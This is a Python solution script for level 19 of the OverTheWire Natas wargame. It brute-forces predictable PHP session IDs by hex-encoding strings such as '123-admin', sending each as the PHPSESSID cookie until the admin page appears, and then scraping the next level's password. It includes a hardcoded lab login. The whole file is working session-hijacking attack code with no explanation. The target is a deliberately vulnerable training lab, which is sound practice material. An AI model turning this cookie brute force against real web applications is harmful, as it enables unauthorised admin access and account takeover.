import requests
import re

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org' % username

with open('natas19.html', 'w+') as out:
    for i in range(641):
        session = requests.Session()
        encoded_hex = bytes("%d-admin" % i, 'utf-8').hex()
        # print('PHPSESSID:', encoded_hex)
        res = session.post(url, auth=(username, password), data={
                           'username': 'admin', 'password': 'anything'}, cookies={'PHPSESSID': encoded_hex})
        content = res.text

        # raw_session_value = bytes.fromhex(
        #     session.cookies['PHPSESSID']).decode('utf-8')
        # print(raw_session_value)

        if ("You are an admin" in content):
            print('PHPSESSID:', encoded_hex, 'random_id:', i)
            flag = re.findall('Password: (.+?)</pre></div>', content)[0]
            out.write(content)
            print(flag)
            break
